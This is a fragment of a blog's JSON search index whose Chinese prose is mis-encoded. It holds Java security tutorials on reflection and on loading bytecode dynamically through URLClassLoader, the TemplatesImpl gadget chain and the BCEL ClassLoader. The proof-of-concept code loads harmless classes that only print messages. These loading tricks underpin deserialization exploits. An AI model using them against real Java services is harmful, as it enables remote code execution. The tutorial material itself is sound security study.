‡æœºå™¨ä¸Šæ‰§è¡Œä»»æ„ä»£ç ï¼Œéœ€è¦æƒ³åŠæ³•è°ƒç”¨æ„é€ å‡½æ•°\nå¦å¤–ï¼Œå› ä¸ºç³»ç»Ÿçš„ ClassLoader#defineClass æ˜¯ä¸€ä¸ªä¿æŠ¤å±æ€§ï¼Œæ‰€ä»¥æˆ‘ä»¬æ— æ³•ç›´æ¥åœ¨å¤–éƒ¨è®¿é—®ï¼Œæ‰€ä»¥éœ€è¦åå°„çš„å½¢å¼æ¥è°ƒç”¨\nè¿è¡ŒåæˆåŠŸåŠ è½½ï¼š\nåœ¨å®é™…åœºæ™¯ä¸­ï¼Œå› ä¸ºdefineClassæ–¹æ³•ä½œç”¨åŸŸæ˜¯ä¸å¼€æ”¾çš„ï¼Œæ‰€ä»¥æ”»å‡»è€…å¾ˆå°‘èƒ½ç›´æ¥åˆ©ç”¨åˆ°å®ƒï¼Œä½†å®ƒå´æ˜¯æˆ‘ä»¬å¸¸ç”¨çš„ä¸€ä¸ªæ”»å‡»é“¾ TemplatesImpl çš„åŸºçŸ³\nTemplatesImpl com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImplè¿™ä¸ªç±»ä¸­å®šä¹‰äº†ä¸€ä¸ªå†…éƒ¨ç±»TransletClassLoader ï¼š\nè¿™ä¸ªç±»é‡Œé‡å†™äº† defineClass æ–¹æ³•ï¼Œå¹¶ä¸”è¿™é‡Œæ²¡æœ‰æ˜¾å¼åœ°å£°æ˜å…¶å®šä¹‰åŸŸï¼Œæ‰€ä»¥è¿™é‡Œçš„ defineClass ç”±å…¶çˆ¶ç±»çš„protectedç±»å‹å˜æˆäº†ä¸€ä¸ªdefaultç±»å‹çš„æ–¹æ³•ï¼Œå¯ä»¥è¢«ç±»å¤–éƒ¨è°ƒç”¨\næˆ‘ä»¬å‘å‰è¿½æº¯ä¸€ä¸‹è°ƒç”¨é“¾ï¼š\nTemplatesImpl#getOutputProperties() TemplatesImpl#newTransformer() TemplatesImpl#getTransletInstance() TemplatesImpl#defineTransletClasses() TransletClassLoader#defineClass() è¿™é‡Œæœ€å‰é¢ä¸¤ä¸ªæ–¹æ³•çš„ä½œç”¨åŸŸéƒ½æ˜¯publicï¼Œå¯ä»¥è¢«å¤–éƒ¨è°ƒç”¨ï¼Œäºæ˜¯æœ‰äº†å¦‚ä¸‹pocï¼š\npackage com.yuy0ung.urlclassloader; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.util.Base64; public class TestTemplatesImpl { public static void main(String[] args) throws Exception { // source: bytecodes/HelloTemplateImpl.java byte[] code = Base64.getDecoder().decode(\u0026#34;yv66vgAAADQAIQoABgASCQATABQIABUKABYAFwcAGAcAGQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAaAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgEAClNvdXJjZUZpbGUBABdIZWxsb1RlbXBsYXRlc0ltcGwuamF2YQwADgAPBwAbDAAcAB0BABNIZWxsbyBUZW1wbGF0ZXNJbXBsBwAeDAAfACABABJIZWxsb1RlbXBsYXRlc0ltcGwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWACEABQAGAAAAAAADAAEABwAIAAIACQAAABkAAAADAAAAAbEAAAABAAoAAAAGAAEAAAAIAAsAAAAEAAEADAABAAcADQACAAkAAAAZAAAABAAAAAGxAAAAAQAKAAAABgABAAAACgALAAAABAABAAwAAQAOAA8AAQAJAAAALQACAAEAAAANKrcAAbIAAhIDtgAEsQAAAAEACgAAAA4AAwAAAA0ABAAOAAwADwABABAAAAACABE=\u0026#34;); TemplatesImpl obj = new TemplatesImpl(); setFieldValue(obj, \u0026#34;_bytecodes\u0026#34;, new byte[][] {code}); setFieldValue(obj, \u0026#34;_name\u0026#34;, \u0026#34;HelloTemplatesImpl\u0026#34;); setFieldValue(obj, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); obj.newTransformer(); } private static void setFieldValue(Object obj, String fieldName, Object value) throws Exception { java.lang.reflect.Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj, value); } } è¿™é‡Œè®¾ç½®äº†ä¸‰ä¸ªå±æ€§ï¼š _bytecodes ã€ _nameå’Œ _tfactory ã€‚ _bytecodes æ˜¯ç”±å­—èŠ‚ç ç»„æˆçš„æ•°ç»„ï¼› _name å¯ä»¥æ˜¯ä»»æ„å­—ç¬¦ä¸²ï¼Œåªè¦ä¸ä¸ºnullå³å¯ï¼›_tfactory éœ€è¦æ˜¯ä¸€ä¸ª TransformerFactoryImpl å¯¹è±¡ï¼Œå› ä¸ºTemplatesImpl#defineTransletClasses() æ–¹æ³•é‡Œæœ‰è°ƒç”¨åˆ°_tfactory.getExternalExtensionsMap() ï¼Œå¦‚æœæ˜¯nullä¼šå‡ºé”™\nå¦å¤–ï¼Œ TemplatesImpl ä¸­åŠ è½½çš„å­—èŠ‚ç å¯¹åº”çš„ç±»å¿…é¡»æ˜¯ com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet çš„å­ç±»ï¼Œæ‰€ä»¥è¿™é‡Œçš„å­—èŠ‚ç æ¥è‡ªäºæˆ‘ä»¬æ„é€ çš„ä¸€ä¸ªç‰¹æ®Šçš„ç±»ï¼š\nimport com.sun.org.apache.xalan.internal.xsltc.DOM; import com.sun.org.apache.xalan.internal.xsltc.TransletException; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator; import com.sun.org.apache.xml.internal.serializer.SerializationHandler; public class HelloTemplatesImpl extends AbstractTranslet { public void transform(DOM document, SerializationHandler[] handlers) throws TransletException { } public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException { } public HelloTemplatesImpl() { super(); System.out.println(\u0026#34;Hello TemplatesImpl\u0026#34;); } } å°†å…¶ç¼–è¯‘æˆå­—èŠ‚ç ï¼Œå³å¯è¢«TemplatesImpl æ‰§è¡Œï¼Œè¿è¡Œå³å¯åŠ è½½å­—èŠ‚ç ï¼š BCEL ClassLoader BCELçš„å…¨ååº”è¯¥æ˜¯Apache Commons BCELï¼Œå±äºApache Commonsé¡¹ç›®ä¸‹çš„ä¸€ä¸ªå­é¡¹ç›®ï¼Œä½†å…¶å› ä¸ºè¢«Apache Xalanæ‰€ä½¿ç”¨ï¼Œè€ŒApache Xalanåˆæ˜¯Javaå†…éƒ¨å¯¹äºJAXPçš„å®ç°ï¼Œæ‰€ä»¥BCELä¹Ÿè¢«åŒ…å«åœ¨äº†JDKçš„åŸç”Ÿåº“ä¸­\nå¯ä»¥é€šè¿‡BCELæä¾›çš„ä¸¤ä¸ªç±» Repository å’Œ Utility æ¥åˆ©ç”¨ï¼ŒRepository ç”¨äºå°†ä¸€ä¸ªJava Class\nå…ˆè½¬æ¢æˆåŸç”Ÿå­—èŠ‚ç ï¼Œå½“ç„¶è¿™é‡Œä¹Ÿå¯ä»¥ç›´æ¥ä½¿ç”¨javacå‘½ä»¤æ¥ç¼–è¯‘javaæ–‡ä»¶ç”Ÿæˆå­—èŠ‚ç ï¼› Utility ç”¨äºå°†åŸç”Ÿçš„å­—èŠ‚ç è½¬æ¢æˆBCELæ ¼å¼çš„å­—èŠ‚ç ï¼š\npackage com.yuy0ung.urlclassloader; import com.sun.org.apache.bcel.internal.classfile.JavaClass; import com.sun.org.apache.bcel.internal.classfile.Utility; import com.sun.org.apache.bcel.internal.Repository; public class BCELclassloaderTest { public static void main(String []args) throws Exception { JavaClass cls = Repository.lookupClass(evil.Hello.class); String code = Utility.encode(cls.getBytes(), true); System.out.println(code); } } è¿è¡Œç”ŸæˆBCELå­—èŠ‚ç ï¼š ä½¿ç”¨BCEL ClassLoaderç”¨äºåŠ è½½è¿™ä¸²ç‰¹æ®Šçš„â€œå­—èŠ‚ç â€å³å¯æ‰§è¡Œï¼š\npackage com.yuy0ung.urlclassloader; import com.sun.org.apache.bcel.internal.util.ClassLoader; public class LoadBCEL { public static void main(String[] args) throws ClassNotFoundException, InstantiationException, IllegalAccessException { new ClassLoader().loadClass(\u0026#34;$$BCEL$$$l$8b$I$A$A$A$A$A$A$AmP$cbJ$DA$Q$acIv$b3$PW$T$T$e3$5b$83$H$n$f1$e0$5e$bc$rx$R$c4$c3$a2B$q$f7$c9$3a$c4$J$93$5d$d9L$C$7e$96$k$U$3c$f8$B$7e$94$d83$G$l$60$l$ba$e8$aa$ea$a2$e9$f7$8f$d77$A$th$85$a8$605$40$j$N$lk$n$9aX$f7$b0$e1a$93$a1$d2$93$99$d4$a7$M$e5vg$c0$e0$9c$e5$b7$82$a1$9a$c8L$5c$ce$sCQ$dc$f0$a1$o$a6$9e$e4$vW$D$5eH3$_HG$df$c9$vC$94$88$b9T$f1$85P$w$ef2$f8$bdT$zB$c3$7e$3e$xRq$$$8d$3b$b4$86$e31$9f$f3$I$k$7c$P$5b$R$b6$b1$c3$e0Z$c5$c3n$84$3d$ec$93$f3$t$8f$a1f$Wb$c5$b3Q$7c5$i$8bT$ff$a1$fa$PS$z$st$7e$3e$p$a1$99XE$e6$f1u$n3$dd$d7$85$e0$T$3a$a9$f1$P$cd$e0$dd$9bIe$b4$d7N$7eEj$a2G$dd$ce$A$Hp$e9q$a6J$60$e6d$ea$BM1$n$pt$8f$5e$c0$k$ad$iR$afX$b2$8c$r$ea$d1$97$81p$99$d0$c7$ca$f7$f2$n$b9M$FO$u$d5$cb$cfpL$A$b3$B$a1$95$5c$b2$9a$a8$aa$N$ae$7d$C$v$c1$91$B$c6$B$A$A\u0026#34;).newInstance(); } } è¿è¡ŒæˆåŠŸåŠ è½½BCELå­—èŠ‚ç ï¼š\n",
        "summary": "javaå®‰å…¨åŸºç¡€-åŠ¨æ€åŠ è½½å­—èŠ‚ç  å­—èŠ‚ç  ä¸¥æ ¼æ¥è¯´ï¼ŒJavaå­—èŠ‚ç ï¼ˆByteCodeï¼‰å…¶å®ä»…ä»…æŒ‡çš„æ˜¯Javaè™šæ‹Ÿæœºæ‰§è¡Œä½¿ç”¨çš„ä¸€ç±»æŒ‡ä»¤ï¼Œé€šå¸¸è¢«å­˜å‚¨åœ¨.classæ–‡ä»¶ä¸­ï¼Œè€Œ.classæ–‡ä»¶å¯ä»¥åœ¨JVMä¸­è¿è¡Œ\næœ¬æ–‡ä¸­æ‰€è¯´çš„â€œå­—èŠ‚ç â€ï¼Œå¯ä»¥ç†è§£çš„æ›´å¹¿ä¹‰ä¸€äº›â€”â€”æ‰€æœ‰èƒ½å¤Ÿæ¢å¤æˆä¸€ä¸ªç±»å¹¶åœ¨JVMè™šæ‹Ÿæœºé‡ŒåŠ è½½çš„å­—èŠ‚åºåˆ—ï¼Œéƒ½åœ¨æ¢è®¨èŒƒå›´å†…\nURLClassLoader ClassLoaderæ˜¯æ¥ç”¨æ¥åŠ è½½å­—èŠ‚ç æ–‡ä»¶æœ€åŸºç¡€çš„æ–¹æ³•ï¼Œè€Œè¿™é‡Œçš„URLClassLoaderå¯ä»¥ç”¨æ¥è¿œç¨‹åŠ è½½å­—èŠ‚ç \næ­£å¸¸æƒ…å†µä¸‹ï¼ŒJavaä¼šæ ¹æ®é…ç½®é¡¹ sun.boot.class.path å’Œ java.class.path ä¸­åˆ—ä¸¾åˆ°çš„åŸºç¡€è·¯å¾„ï¼ˆè¿™äº›è·¯å¾„æ˜¯ç»è¿‡å¤„ç†åçš„ java.net.URL ç±»ï¼‰æ¥å¯»æ‰¾.classæ–‡ä»¶æ¥åŠ è½½ï¼Œè€Œè¿™ä¸ªåŸºç¡€è·¯å¾„æœ‰åˆ†ä¸ºä¸‰ç§æƒ…å†µï¼š\nURLæœªä»¥æ–œæ  / ç»“å°¾ï¼Œåˆ™è®¤ä¸ºæ˜¯ä¸€ä¸ªJARæ–‡ä»¶ï¼Œä½¿ç”¨ JarLoader æ¥å¯»æ‰¾ç±»ï¼Œå³ä¸ºåœ¨JaråŒ…ä¸­å¯»æ‰¾.classæ–‡ä»¶\nURLä»¥æ–œæ  / ç»“å°¾ï¼Œä¸”åè®®åæ˜¯ file ï¼Œåˆ™ä½¿ç”¨ FileLoader æ¥å¯»æ‰¾ç±»ï¼Œå³ä¸ºåœ¨æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿä¸­å¯»æ‰¾.classæ–‡ä»¶\nURLä»¥æ–œæ  / ç»“å°¾ï¼Œä¸”åè®®åä¸æ˜¯ file ï¼Œåˆ™ä½¿ç”¨æœ€åŸºç¡€çš„ Loader æ¥å¯»æ‰¾ç±»\nè¿™é‡Œå…³æ³¨ç¬¬ä¸‰ç§ï¼Œè¿œç¨‹åŠ è½½çš„è¯ï¼Œæˆ‘ä»¬ä¸€èˆ¬ä½¿ç”¨http://åè®®ï¼Œçœ‹çœ‹ä¸‹é¢è¿™ä¸ªdemoï¼š é¦–å…ˆå†™ä¸€ä¸ªè®¿é—®http://127.0.0.1:8000/test.classçš„ç¨‹åºï¼š\npackage com.yuy0ung.urlclassloader; import java.net.MalformedURLException; import java.net.URL; import java.net.URLClassLoader; public class loadertest { public static void main(String[] args) throws MalformedURLException, ClassNotFoundException, InstantiationException, IllegalAccessException { URL[] urls = {new URL(\u0026#34;http://localhost:8000/\u0026#34;)}; URLClassLoader loader = URLClassLoader.newInstance(urls); Class c = loader.loadClass(\u0026#34;test\u0026#34;); c.newInstance(); } } ç„¶åå†™ä¸€ä¸ªæœ‰è¾“å‡ºçš„testç¨‹åºç¼–è¯‘æˆclassæ–‡ä»¶æ”¾åœ¨localhost:8000ä¸Šï¼š\n"
    }
,
    {
        "title": "javaå®‰å…¨åŸºç¡€-åå°„",
        "link": "/My-Knowlege-Database/blog/java%E5%AE%89%E5%85%A8/java%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/java%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80-%E5%8F%8D%E5%B0%84/",
        "content": "javaå®‰å…¨åŸºç¡€-åå°„ æ¦‚å¿µ Javaåå°„æœºåˆ¶æ˜¯åœ¨è¿è¡ŒçŠ¶æ€æ—¶ï¼Œå¯¹äºä»»æ„ä¸€ä¸ªç±»ï¼Œéƒ½èƒ½å¤Ÿè·å–åˆ°è¿™ä¸ªç±»çš„æ‰€æœ‰å±æ€§å’Œæ–¹æ³•ï¼Œå¯¹äºä»»æ„ä¸€ä¸ªå¯¹è±¡ï¼Œéƒ½èƒ½å¤Ÿè°ƒç”¨å®ƒçš„ä»»æ„ä¸€ä¸ªæ–¹æ³•å’Œå±æ€§(åŒ…æ‹¬ç§æœ‰çš„æ–¹æ³•å’Œå±æ€§)ï¼Œè¿™ç§åŠ¨æ€è·å–çš„ä¿¡æ¯ä»¥åŠåŠ¨æ€è°ƒç”¨å¯¹è±¡çš„æ–¹æ³•çš„åŠŸèƒ½å°±ç§°ä¸ºjavaè¯­è¨€çš„åå°„æœºåˆ¶ã€‚\nPç¥æ˜¯è¿™æ ·æè¿°çš„ï¼šâ€œåå°„æ˜¯å¤§å¤šæ•°è¯­è¨€é‡Œéƒ½å¿…ä¸å¯å°‘çš„ç»„æˆéƒ¨åˆ†ï¼Œå¯¹è±¡å¯ä»¥é€šè¿‡åå°„è·å–ä»–çš„ç±»ï¼Œç±»å¯ä»¥é€šè¿‡åå°„æ‹¿åˆ°æ‰€æœ‰æ–¹æ³•ï¼ˆåŒ…æ‹¬ç§æœ‰ï¼‰ï¼Œæ‹¿åˆ°çš„æ–¹æ³•å¯ä»¥è°ƒç”¨ï¼Œæ€»ä¹‹é€šè¿‡â€œåå°„â€ï¼Œæˆ‘ä»¬å¯ä»¥å°†Javaè¿™ç§é™æ€è¯­è¨€é™„åŠ ä¸ŠåŠ¨æ€ç‰¹æ€§ã€‚â¼€æ®µä»£ç ï¼Œæ”¹å˜å…¶ä¸­çš„å˜é‡ï¼Œå°†ä¼šå¯¼è‡´è¿™æ®µä»£ç äº§ç”ŸåŠŸèƒ½æ€§çš„å˜åŒ–ï¼Œç§°ä¹‹ä¸ºåŠ¨æ€ç‰¹æ€§ã€‚â€\nåå°„çš„å®ç° JVMä¸ºæ¯ä¸ªåŠ è½½çš„classåˆ›å»ºäº†å¯¹åº”çš„Classå®ä¾‹ï¼Œå¹¶åœ¨å®ä¾‹ä¸­ä¿å­˜äº†è¯¥classçš„æ‰€æœ‰ä¿¡æ¯ï¼›å› æ­¤ï¼Œå¦‚æœè·å–äº†æŸä¸ªClasså®ä¾‹ï¼Œæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡è¿™ä¸ªClasså®ä¾‹è·å–åˆ°è¯¥å®ä¾‹å¯¹åº”çš„classçš„æ‰€æœ‰ä¿¡æ¯\nä¸åå°„æœ‰å…³çš„åŒ…/ç±» ä¸åå°„æœ‰å…³çš„åŒ… å¼•å…¥ä¸åå°„æœ‰å…³çš„åŒ…\nimport java.lang.reflect.*; åå°„ä¸­æ¯”è¾ƒé‡è¦çš„ç±» java.lang.Class\nè¿™ä¸ªç±»ä»£è¡¨ç€å­—èŠ‚ç ï¼Œæ•´ä¸ªç±»\njava.lang.reflect.Method\nä»£è¡¨å­—èŠ‚ç  (ç±») ä¸­çš„æˆå‘˜æ–¹æ³•\njava.lang.reflect.Constructor\nä»£è¡¨å­—èŠ‚ç  (ç±») ä¸­çš„æ„é€ æ–¹æ³•\njava.lang.reflect.Field\nä»£è¡¨å­—èŠ‚ç  (ç±») ä¸­çš„æˆå‘˜å˜é‡\nè°ƒç”¨æ–¹æ³• æ¬²è¦è°ƒç”¨ä¸€ä¸ªå¯¹è±¡çš„ä»»æ„æ–¹æ³•ï¼Œæœ‰ä¸‰æ­¥ï¼š\nè·å¾—è¯¥å¯¹è±¡å¯¹åº”çš„Classç±»çš„å®ä¾‹ é€šè¿‡è¯¥Classç±»çš„å®ä¾‹æ¥è·å–æ¬²è¦è°ƒç”¨çš„é‚£ä¸ªæ–¹æ³• æ‹¿åˆ°å¯¹åº”æ–¹æ³•åï¼Œç»™è¯¥æ–¹æ³•ä¼ å…¥å¯¹åº”å‚æ•°è¿›è¡Œè°ƒç”¨ æ¥ä¸‹æ¥æ˜¯å…·ä½“çš„å®ç°æµç¨‹ï¼Œä»¥å¦‚ä¸‹Userç±»çš„setName()æ–¹æ³•ä¸ºä¾‹ï¼š\npublic class User{ private String name; private int age; @Override public String toString(){ return \u0026#34;User{\u0026#34; + \u0026#34;name=\u0026#34; +name + \u0026#34;, age=\u0026#34;+age+\u0026#34;}\u0026#34;; } public String getName() { return name; } public void setName(String name) { this.name = name; } public int getAge() { return age; } public void setAge(int age) { this.age = age; } } 1.è·å¾—ç±»å®ä¾‹ æ–¹æ³•æœ‰ä¸‰ï¼š\nå¦‚æœå·²ç»åŠ è½½äº†æŸä¸ªç±»ï¼Œå¯ä»¥ç›´æ¥è®¿é—®è¯¥ç±»çš„classå±æ€§ï¼Œè¯¥å±æ€§å°±å­˜å‚¨ç€è¯¥ç±»å¯¹åº”çš„Classç±»çš„å®ä¾‹ï¼ˆä½¿ç”¨.classæ¥åˆ›å»ºClasså¯¹è±¡çš„å¼•ç”¨æ—¶ï¼Œä¸ä¼šè‡ªåŠ¨åˆå§‹åŒ–è¯¥Classå¯¹è±¡ï¼‰\npublic class test { public static void main(String[] args) { Class cls = User.class; System.out.println(cls); } } å¦‚æœä¸Šä¸‹æ–‡ä¸­å­˜åœ¨æŸä¸ªç±»çš„å®ä¾‹ï¼Œå¯ä»¥é€šè¿‡è¯¥å®ä¾‹å˜é‡æä¾›çš„getClass()æ–¹æ³•è·å–ï¼Œä¹Ÿå¯ä»¥è°ƒç”¨æŸå®ä¾‹åŒ–å¯¹è±¡çš„getClass()æ–¹æ³•è·å–:\nUser user = new User(); Class cls = user.getClass(); //æˆ– Class cls = (new User()).getClass(); çŸ¥é“ä¸€ä¸ªclassçš„å®Œæ•´ç±»åï¼ˆä¾‹å¦‚java.lang.Stringï¼‰ï¼Œå¯ä»¥é€šè¿‡é™æ€æ–¹æ³•Class.forName()è·å–ã€‚(ä½¿ç”¨forName()ä¼šè‡ªåŠ¨åˆå§‹åŒ–è¯¥Classå¯¹è±¡ï¼‰\npublic class test { public static void main(String[] args) throws Exception { Class cls = Class.forName(\u0026#34;User\u0026#34;); System.out.println(cls); } } forNameæœ‰ä¸¤ä¸ªå‡½æ•°é‡è½½\nClass\u0026lt;?\u0026gt; forName(String name) Class\u0026lt;?\u0026gt; forName(String name, **boolean** initialize, ClassLoader loader) Class.forName(className) // ç­‰äº Class.forName(className, true, currentLoader) ç¬¬äºŒä¸ªå‚æ•°è¡¨ç¤ºæ˜¯å¦åˆå§‹åŒ–ï¼Œåœ¨ forName çš„æ—¶å€™ï¼Œæ„é€ å‡½æ•°å¹¶ä¸ä¼šæ‰§â¾ï¼Œè€Œæ˜¯æ‰§â¾ç±»åˆå§‹åŒ–ã€‚ä»–ä¼šæ‰§è¡Œstatic{}é™æ€å—é‡Œé¢çš„å†…å®¹\npackage com.yuy0ung.reflect02; public class TrainPrint { { System.out.printf(\u0026#34;Empty block initial %s\\n\u0026#34;, this.getClass()); } static { System.out.printf(\u0026#34;Static initial %s\\n\u0026#34;, TrainPrint.class); } public TrainPrint() { System.out.printf(\u0026#34;Initial %s\\n\u0026#34;, this.getClass()); } } public class TemporaryFiles { public static void main(String[] args) { TrainPrint t1 = new TrainPrint();//å®ä¾‹åŒ–TrainPrint } } å½“å®ä¾‹åŒ–è¿™ä¸ªç±»æ—¶ï¼Œâ¾¸å…ˆè°ƒâ½¤çš„æ˜¯static {}ï¼Œå…¶æ¬¡æ˜¯ {} ï¼Œæœ€åæ˜¯æ„é€ å‡½æ•°ã€‚å…¶ä¸­static {}å°±æ˜¯åœ¨ç±»åˆå§‹åŒ–çš„æ—¶å€™è°ƒç”¨çš„\nç”±äºClasså®ä¾‹åœ¨JVMä¸­æ˜¯å”¯ä¸€çš„ï¼Œæ‰€ä»¥ï¼Œä¸Šè¿°æ–¹æ³•è·å–çš„Classå®ä¾‹æ˜¯åŒä¸€ä¸ªå®ä¾‹\n2.è·å–æ–¹æ³• æ–¹æ³•å¦‚ä¸‹ï¼š\nMethod getMethod(name, Class...)ï¼šè·å–æŸä¸ªpublicçš„Methodï¼ˆåŒ…æ‹¬çˆ¶ç±»ï¼‰ Method getDeclaredMethod(name, Class...)ï¼šè·å–å½“å‰ç±»çš„æŸä¸ªMethodï¼Œmodifiersä¸é™ï¼ˆä¸åŒ…æ‹¬çˆ¶ç±»ï¼‰ Method[] getMethods()ï¼šè·å–æ‰€æœ‰publicçš„Methodï¼ˆåŒ…æ‹¬çˆ¶ç±»ï¼‰ Method[] getDeclaredMethods()ï¼šè·å–å½“å‰ç±»çš„æ‰€æœ‰Methodï¼Œmodifiersä¸é™ï¼ˆä¸åŒ…æ‹¬çˆ¶ç±»ï¼‰ Classè¡¨ç¤ºæ–¹æ³•è¿”å›å€¼ç±»å‹ï¼Œæ— è¿”å›å€¼åˆ™ä¸ºnull javaä¸­æ‰€æœ‰çš„æ–¹æ³•éƒ½æ˜¯Methodç±»å‹ï¼Œæ‰€ä»¥æˆ‘ä»¬é€šè¿‡åå°„æœºåˆ¶è·å–åˆ°æŸä¸ªå¯¹è±¡çš„æ–¹æ³•ä¹Ÿæ˜¯Methodç±»å‹çš„ï¼š\nMethod method = cls.getMethod(\u0026#34;setName\u0026#34;, String.class); ä¸€ä¸ªMethodå¯¹è±¡åŒ…å«ä¸€ä¸ªæ–¹æ³•çš„æ‰€æœ‰ä¿¡æ¯:\ngetName()ï¼šè¿”å›æ–¹æ³•åç§° getReturnType()ï¼šè¿”å›æ–¹æ³•è¿”å›å€¼ç±»å‹ï¼Œä¹Ÿæ˜¯ä¸€ä¸ªClasså®ä¾‹ getParameterTypes()ï¼šè¿”å›æ–¹æ³•çš„å‚æ•°ç±»å‹ï¼Œæ˜¯ä¸€ä¸ªClassæ•°ç»„ getModifiers()ï¼šè¿”å›æ–¹æ³•çš„ä¿®é¥°ç¬¦ 3.è°ƒç”¨æ–¹æ³• Methodç±»ä¸­æœ‰ä¸€ä¸ªinvokeæ–¹æ³•ï¼Œå°±æ˜¯ç”¨æ¥è°ƒç”¨ç‰¹å®šæ–¹æ³•çš„\ninvokeçš„ä½œç”¨æ˜¯æ‰§è¡Œæ–¹æ³•ï¼Œå®ƒçš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯è°ƒç”¨è¯¥æ–¹æ³•çš„å¯¹è±¡ï¼š\nå¦‚æœè¿™ä¸ªæ–¹æ³•æ˜¯ä¸€ä¸ªæ™®é€šæ–¹æ³•ï¼Œé‚£ä¹ˆç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ç±»å¯¹è±¡ å¦‚æœè¿™ä¸ªæ–¹æ³•æ˜¯ä¸€ä¸ªé™æ€æ–¹æ³•ï¼Œé‚£ä¹ˆç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ç±» æ¯”å¦‚æ­£å¸¸æ‰§è¡Œæ–¹æ³•æ˜¯ [ç±»/ç±»å¯¹è±¡].method([å‚æ•°1], [å‚æ•°2]\u0026hellip;) ï¼Œå…¶å®åœ¨åå°„é‡Œå°±æ˜¯method.invoke([ç±»/ç±»å¯¹è±¡], [å‚æ•°1], [å‚æ•°2]\u0026hellip;)\nç¬¬äºŒä¸ªå‚æ•°æ˜¯ä¸€ä¸ªå¯å˜é•¿å‚æ•°ï¼Œæ˜¯è¿™ä¸ªæ–¹æ³•çš„éœ€è¦ä¼ å…¥çš„å‚æ•°ï¼Œè¿™é‡Œä¸ä¸Šæ–‡ä»£ç é…åˆè°ƒç”¨setNameæ–¹æ³•ï¼š\nMethod method = cls.getMethod(\u0026#34;setName\u0026#34;, String.class); method.invoke((new User()), \u0026#34;Yuy0ung\u0026#34;); //æˆ– User user = new User(); Method method = cls.getMethod(\u0026#34;setName\u0026#34;, String.class); method.invoke(user, \u0026#34;Yuy0ung\u0026#34;); å¦‚æ­¤å¯ä»¥æˆåŠŸè°ƒç”¨setNameæ–¹æ³•ï¼Œå¹¶è®¾ç½®nameä¸ºâ€œYuy0ungâ€,demoå¦‚ä¸‹ï¼š\npackage com.yuy0ung.reflect01; import java.lang.reflect.InvocationTargetException; import java.lang.reflect.Method; public class Test05 { public static void main(String[] args) throws NoSuchMethodException, InvocationTargetException, IllegalAccessException { Class cls = User.class; User user = new User(); Method method = cls.getMethod(\u0026#34;setName\u0026#34;, String.class); method.invoke(user, \u0026#34;Yuy0ung\u0026#34;); Method method1 = cls.getMethod(\u0026#34;getName\u0026#34;); String name = (String) method1.invoke(user); //å°†objectè½¬æ¢ä¸º System.out.println(name); } } å¦‚æœæ–¹æ³•å¹¶ä¸æ˜¯publicå±æ€§ï¼Œå¯ä»¥ä½¿ç”¨Method.setAccessible(true)å…è®¸å…¶è°ƒç”¨ï¼Œdemoå¦‚ä¸‹ï¼š\npackage Demo; import java.lang.reflect.Method; public class TemporaryFiles{ public static void main(String[] args) throws Exception{ Class cls = Student.class;//è·å–Studentç±»çš„å®ä¾‹ Method m = cls.getDeclaredMethod(\u0026#34;hello\u0026#34;, String.class);//è·å–helloæ–¹æ³• m.setAccessible(true);//å…è®¸è°ƒç”¨privateæ–¹æ³• m.invoke(cls.newInstance(), \u0026#34;Yuy0ung\u0026#34;);//è°ƒç”¨helloè¾“å‡º\u0026#34;hello, Yuy0ung\u0026#34; } } class Student extends Person{ public int score; private int grade; private void hello(String s){ System.out.println(\u0026#34;hello, \u0026#34; + s); } } class Person{ public String name = \u0026#34;Yuy0ung\u0026#34;; } //è¾“å‡ºï¼šhello, Yuy0ung è®¿é—®å­—æ®µ åˆ©ç”¨åå°„é™¤äº†å¯ä»¥è·å–å¹¶è°ƒç”¨æ–¹æ³•ï¼Œè¿˜å¯ä»¥è·å–å¹¶ä¿®æ”¹å­—æ®µ\n1.è·å–å­—æ®µ æœ‰å¦‚ä¸‹æ–¹æ³•è·å–å­—æ®µï¼š\nField getField(name)ï¼šæ ¹æ®å­—æ®µåè·å–æŸä¸ªpublicçš„fieldï¼ˆåŒ…æ‹¬çˆ¶ç±»ï¼‰ Field getDeclaredField(name)ï¼šæ ¹æ®å­—æ®µåè·å–å½“å‰ç±»çš„fieldï¼Œmodifiersä¸é™ï¼ˆä¸åŒ…æ‹¬çˆ¶ç±»ï¼‰ Field[] 